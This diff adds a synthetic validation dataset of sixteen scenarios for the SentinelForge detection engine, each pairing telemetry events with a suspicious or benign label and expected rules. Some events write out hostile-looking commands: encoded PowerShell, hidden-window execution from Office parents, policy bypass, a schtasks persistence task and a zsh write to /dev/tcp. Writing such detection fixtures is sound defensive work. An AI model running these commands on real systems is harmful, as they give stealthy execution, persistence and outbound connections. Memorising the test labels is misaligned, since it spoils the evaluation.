@@ -1,0 +1,716 @@
+{
+  "schema_version": 1,
+  "name": "SentinelForge evidence-context experiment",
+  "version": "2.0.0",
+  "partition": "validation",
+  "evaluation_time": "2026-11-17T12:00:00Z",
+  "provenance": "Hand-authored synthetic scenarios; no captured external or deployment telemetry",
+  "labeling_criteria": "Assigned action intent is explicit in each scenario reason. No label or scenario metadata is submitted as telemetry. Context is separately configured through authenticated operator APIs. Ambiguous intent-only cases are retained as difficult examples.",
+  "independence": "Scenario/template is the unit. Variants within a partition are correlated regression evidence, not independent population observations. Validation and holdout were authored during implementation; neither is representative external validation.",
+  "selection_plan": {
+    "scenarios": 16,
+    "positive": 8,
+    "negative": 8,
+    "chosen_before_target_results": true
+  },
+  "scenarios": [
+    {
+      "id": "validation-quoted-executable-short-encoding",
+      "origin_template": "quoted-executable-short-encoding",
+      "session_id": "validation-session-01",
+      "suspicious": true,
+      "reason": "Operator-unapproved abbreviated encoded argument after a quoted executable",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "sensor-validation-01",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-17T09:00:00Z",
+            "Computer": "validation-node-01",
+            "User": "lab\\operator-validation",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -e SQBFAFgA",
+            "RecordID": "session-validation-01-event-1"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-mail-child-hidden-file",
+      "origin_template": "mail-child-hidden-file",
+      "session_id": "validation-session-02",
+      "suspicious": true,
+      "reason": "Synthetic mail-client child uses hidden-window file execution",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-02",
+          "payload": {
+            "host": "validation-node-02",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-02-event-1",
+            "parent": "C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE",
+            "command": "pwsh -WindowStyle Hidden -File \"C:\\Users\\Public\\job.ps1\"",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-renamed-presentation-child",
+      "origin_template": "renamed-presentation-child",
+      "session_id": "validation-session-03",
+      "suspicious": true,
+      "reason": "Sensor-observed original filename identifies renamed PowerShell with suspicious parent and bypass",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-03",
+          "payload": {
+            "host": "validation-node-03",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-03-event-1",
+            "parent": "C:\\Program Files\\Microsoft Office\\POWERPNT.EXE",
+            "fields": {
+              "original_file_name": "PowerShell.EXE"
+            },
+            "command": "helper.exe -File \"D:\\Scripts\\load.ps1\" -ExecutionPolicy Bypass",
+            "process": "D:\\Tools\\helper.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-approval-other-host",
+      "origin_template": "approval-other-host",
+      "session_id": "validation-session-04",
+      "suspicious": true,
+      "reason": "Matching action digest with a binding for another host is not an exemption",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000004"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-04",
+          "payload": {
+            "host": "validation-node-04",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-04-event-1",
+            "command": "schtasks /create /tn UpdateStage /tr stage.exe /sc onstart",
+            "process": "C:\\Windows\\System32\\schtasks.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-validation-04",
+            "host": "validation-wrong-host",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ],
+        "approvals": [
+          {
+            "binding_key": "observed-sensor",
+            "rule_id": "00000000-0000-0000-0000-000000000004",
+            "user": "lab\\operator-validation",
+            "command_sha256": "f63f171eb0c173470d3427f0eb9111db0c7aea395cea92454e36c7d102edc874",
+            "reason": "Operator reviewed this exact synthetic administrative action",
+            "valid_from": "2026-11-17T08:00:00Z",
+            "valid_until": "2026-11-17T10:00:00Z",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "validation-approval-other-identity",
+      "origin_template": "approval-other-identity",
+      "session_id": "validation-session-05",
+      "suspicious": true,
+      "reason": "Matching action digest with a different observed identity must still alert",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-05",
+          "payload": {
+            "host": "validation-node-05",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-05-event-1",
+            "command": "powershell -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAA1AA==",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-validation-05",
+            "host": "validation-node-05",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ],
+        "approvals": [
+          {
+            "binding_key": "observed-sensor",
+            "rule_id": "00000000-0000-0000-0000-000000000002",
+            "user": "lab\\different-user",
+            "command_sha256": "79652cd7dd85ddd23733062e2e0dce112393ae77386c4c1d04fe80f44e5e7917",
+            "reason": "Operator reviewed this exact synthetic administrative action",
+            "valid_from": "2026-11-17T08:00:00Z",
+            "valid_until": "2026-11-17T10:00:00Z",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "validation-ssh-late-boundary-cluster",
+      "origin_template": "ssh-late-boundary-cluster",
+      "session_id": "validation-session-06",
+      "suspicious": true,
+      "reason": "Five failures exactly spanning the 300-second threshold arrive out of order",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000001"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-06",
+          "payload": {
+            "host": "validation-node-06",
+            "timestamp": "2026-11-17T09:05:00+00:00",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "arrival-300",
+            "outcome": "failure",
+            "src_ip": "192.0.2.60",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-06",
+          "payload": {
+            "host": "validation-node-06",
+            "timestamp": "2026-11-17T09:01:15+00:00",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "arrival-75",
+            "outcome": "failure",
+            "src_ip": "192.0.2.60",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-06",
+          "payload": {
+            "host": "validation-node-06",
+            "timestamp": "2026-11-17T09:00:00+00:00",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "arrival-0",
+            "outcome": "failure",
+            "src_ip": "192.0.2.60",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-06",
+          "payload": {
+            "host": "validation-node-06",
+            "timestamp": "2026-11-17T09:03:45+00:00",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "arrival-225",
+            "outcome": "failure",
+            "src_ip": "192.0.2.60",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-06",
+          "payload": {
+            "host": "validation-node-06",
+            "timestamp": "2026-11-17T09:02:30+00:00",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "arrival-150",
+            "outcome": "failure",
+            "src_ip": "192.0.2.60",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-zsh-tcp-write",
+      "origin_template": "zsh-tcp-write",
+      "session_id": "validation-session-07",
+      "suspicious": true,
+      "reason": "Unauthorized direct shell TCP write",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000003"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-07",
+          "payload": {
+            "host": "validation-node-07",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-07-event-1",
+            "command": "zsh -c 'printf signal >/dev/tcp/203.0.113.88/9443'",
+            "process": "/bin/zsh"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-expired-network-intelligence-gap",
+      "origin_template": "expired-network-intelligence-gap",
+      "session_id": "validation-session-08",
+      "suspicious": true,
+      "reason": "Assigned malicious destination has expired intelligence; no current trustworthy evidence should trigger",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-08",
+          "payload": {
+            "host": "validation-node-08",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "network",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-08-event-1",
+            "dst_ip": "208.67.222.222",
+            "dst_port": 443,
+            "process": "C:\\ProgramData\\worker.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-validation-08",
+            "host": "validation-node-08",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ],
+        "indicators": [
+          {
+            "kind": "ip",
+            "value": "208.67.222.222",
+            "purpose": "https-c2",
+            "version": "synthetic-research-validation-v1",
+            "provenance": "urn:sentinelforge:synthetic-experiment:validation:v1",
+            "reason": "Synthetic threat intelligence fixture; not an assertion about a real host",
+            "valid_from": "2026-11-17T08:00:00Z",
+            "valid_until": "2026-11-17T10:00:00Z",
+            "expires_at": "2026-11-17T11:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "validation-untrusted-name-is-not-verdict",
+      "origin_template": "untrusted-name-is-not-verdict",
+      "session_id": "validation-session-09",
+      "suspicious": false,
+      "reason": "A script filename alone is not malicious evidence",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-09",
+          "payload": {
+            "host": "validation-node-09",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-09-event-1",
+            "parent": "C:\\Windows\\explorer.exe",
+            "command": "powershell -NoProfile -File untrusted.ps1",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-developer-build-policy-bypass",
+      "origin_template": "developer-build-policy-bypass",
+      "session_id": "validation-session-10",
+      "suspicious": false,
+      "reason": "Build automation uses bypass without Office ancestry or a malicious digest",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-10",
+          "payload": {
+            "host": "validation-node-10",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-10-event-1",
+            "parent": "C:\\Build\\agent.exe",
+            "command": "powershell -ExecutionPolicy Bypass -File BuildAgent.ps1",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-expired-benign-indicator",
+      "origin_template": "expired-benign-indicator",
+      "session_id": "validation-session-11",
+      "suspicious": false,
+      "reason": "Stale synthetic intelligence on ordinary updates is inert",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-11",
+          "payload": {
+            "host": "validation-node-11",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "network",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-11-event-1",
+            "dst_ip": "1.0.0.1",
+            "dst_port": 443,
+            "fields": {
+              "service": "ssl",
+              "tls_server_name": "updates.example"
+            }
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-validation-11",
+            "host": "validation-node-11",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ],
+        "indicators": [
+          {
+            "kind": "ip",
+            "value": "1.0.0.1",
+            "purpose": "https-c2",
+            "version": "synthetic-research-validation-v1",
+            "provenance": "urn:sentinelforge:synthetic-experiment:validation:v1",
+            "reason": "Synthetic threat intelligence fixture; not an assertion about a real host",
+            "valid_from": "2026-11-17T08:00:00Z",
+            "valid_until": "2026-11-17T10:00:00Z",
+            "expires_at": "2026-11-17T10:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "validation-scheduled-report-approved-boundary",
+      "origin_template": "scheduled-report-approved-boundary",
+      "session_id": "validation-session-12",
+      "suspicious": false,
+      "reason": "Approved reporting action is exactly at the inclusive event-time start",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-12",
+          "payload": {
+            "host": "validation-node-12",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-12-event-1",
+            "command": "schtasks /create /tn ReportExport /tr \"D:\\Apps\\report.exe\" /sc monthly",
+            "process": "C:\\Windows\\System32\\schtasks.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-validation-12",
+            "host": "validation-node-12",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ],
+        "approvals": [
+          {
+            "binding_key": "observed-sensor",
+            "rule_id": "00000000-0000-0000-0000-000000000004",
+            "user": "lab\\operator-validation",
+            "command_sha256": "5d052164b09b773ff46743b5164d53bd3e30a4d8688ebe6609a41a4361d8ad72",
+            "reason": "Operator reviewed this exact synthetic administrative action",
+            "valid_from": "2026-11-17T09:00:00Z",
+            "valid_until": "2026-11-17T10:00:00Z",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "validation-ssh-distinct-source-retries",
+      "origin_template": "ssh-distinct-source-retries",
+      "session_id": "validation-session-13",
+      "suspicious": false,
+      "reason": "Independent benign single retries do not satisfy a same-source threshold",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-13",
+          "payload": {
+            "host": "validation-node-13",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "source-0",
+            "outcome": "failure",
+            "src_ip": "192.0.2.70",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-13",
+          "payload": {
+            "host": "validation-node-13",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "source-1",
+            "outcome": "failure",
+            "src_ip": "192.0.2.71",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-13",
+          "payload": {
+            "host": "validation-node-13",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "source-2",
+            "outcome": "failure",
+            "src_ip": "192.0.2.72",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-13",
+          "payload": {
+            "host": "validation-node-13",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "source-3",
+            "outcome": "failure",
+            "src_ip": "192.0.2.73",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-13",
+          "payload": {
+            "host": "validation-node-13",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "authentication",
+            "user": "lab\\operator-validation",
+            "external_id": "source-4",
+            "outcome": "failure",
+            "src_ip": "192.0.2.74",
+            "fields": {
+              "service": "sshd"
+            }
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-digest-path-mismatch",
+      "origin_template": "digest-path-mismatch",
+      "session_id": "validation-session-14",
+      "suspicious": false,
+      "reason": "A digest for a different path cannot identify the file being executed",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-14",
+          "payload": {
+            "host": "validation-node-14",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-14-event-1",
+            "fields": {
+              "script_path": "C:\\Tools\\different.ps1",
+              "script_sha256": "09b724843d8001d415b0c0d5743bc9d7d5335433f13d498dead3875425950fe9"
+            },
+            "command": "powershell -File C:\\Tools\\signed-maintenance.ps1",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-validation-14",
+            "host": "validation-node-14",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ],
+        "indicators": [
+          {
+            "kind": "sha256",
+            "value": "09b724843d8001d415b0c0d5743bc9d7d5335433f13d498dead3875425950fe9",
+            "purpose": "powershell-script",
+            "version": "synthetic-research-validation-v1",
+            "provenance": "urn:sentinelforge:synthetic-experiment:validation:v1",
+            "reason": "Synthetic threat intelligence fixture; not an assertion about a real host",
+            "valid_from": "2026-11-17T08:00:00Z",
+            "valid_until": "2026-11-17T10:00:00Z",
+            "expires_at": "2026-11-17T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "validation-offline-package-installation",
+      "origin_template": "offline-package-installation",
+      "session_id": "validation-session-15",
+      "suspicious": false,
+      "reason": "Developer installs a local wheel without monitored suspicious primitives",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-15",
+          "payload": {
+            "host": "validation-node-15",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-15-event-1",
+            "command": "pip install --no-deps package.whl",
+            "process": "/usr/bin/pip"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "validation-authorized-security-lab-office-chain",
+      "origin_template": "authorized-security-lab-office-chain",
+      "session_id": "validation-session-16",
+      "suspicious": false,
+      "reason": "Authorized security-lab exercise intentionally has the same risky observed conjunction; a retained false-positive challenge",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-validation-16",
+          "payload": {
+            "host": "validation-node-16",
+            "timestamp": "2026-11-17T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-validation",
+            "external_id": "session-validation-16-event-1",
+            "parent": "C:\\Program Files\\Microsoft Office\\MSACCESS.EXE",
+            "command": "powershell -File lab-demo.ps1 -WindowStyle Hidden",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    }
+  ]
+}
